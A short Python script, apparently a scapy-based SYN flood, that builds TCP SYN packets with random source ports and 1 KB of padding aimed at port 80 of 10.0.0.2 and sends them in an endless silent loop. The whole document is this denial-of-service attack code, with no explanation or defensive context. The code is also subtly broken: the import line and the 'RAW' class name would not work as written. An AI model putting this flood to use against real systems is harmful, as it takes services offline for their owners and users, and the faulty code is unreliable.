from scapy import *

target_ip = "10.0.0.2"
target_port = 80

ip = IP(dst=target_ip)
tcp=TCP(sport=RandShort(), dport=target_port, flags="S")
raw = RAW(b"X"*1024)

p = ip/tcp/raw

send(p, loop=1,verbose=0)
